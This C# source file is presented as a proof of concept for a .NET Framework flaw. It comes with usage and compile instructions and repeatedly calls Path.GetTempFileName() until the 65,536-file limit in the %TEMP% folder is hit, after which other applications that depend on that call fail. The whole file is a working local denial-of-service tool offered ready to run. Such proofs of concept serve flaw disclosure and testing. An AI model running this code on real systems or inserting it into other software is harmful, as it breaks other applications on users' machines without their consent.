// NetFrameworkAppBlocker v1.0 (c) 2022 Sensei (aka 'Q')
// Proof of error in .NET Framework
// Tested on .NET Framework v3.5, v4.0.30319
//
// Usage:
// NetFrameworkAppBlocker
// wait until 65536 files have been created in the %TEMP% folder..
// and no application that uses Path.GetTempFileName() will be able to run or will have any problems.
// (just rerun NetFrameworkAppBlocker)
//
// Compilation:
// %SYSTEMROOT%\Microsoft.NET\Framework\v3.5\csc NetFrameworkAppBlocker.cs
//

using System;
using System.IO;

public class NetFrameworkAppBlocker {
   public static void Main( string [] args ) {
      Console.WriteLine( "NetFrameworkAppBlocker v1.0 (c) 2022 Sensei (aka 'Q')" );
      Console.WriteLine();
      Console.WriteLine( "Proof of error in .NET Framework" );
      Console.WriteLine();
      Console.WriteLine( "Wait until 65536 files have been created in the %TEMP% folder.." );
      Console.WriteLine( "and no application that uses Path.GetTempFileName() will be able to run or will have some problems." );
      Console.WriteLine( "(just rerun NetFrameworkAppBlocker)" );
      Console.WriteLine();

      int count = 100000;
      int i = 0;
      try {
         for( i = 0; i < count; i++ ) {
            string filename = Path.GetTempFileName();
         }
      } catch( IOException e ) {
         Console.WriteLine( "Error" );
         Console.WriteLine( e.Message );
         Console.WriteLine( "after {0} executions of the loop..", i );
      }
   }
}
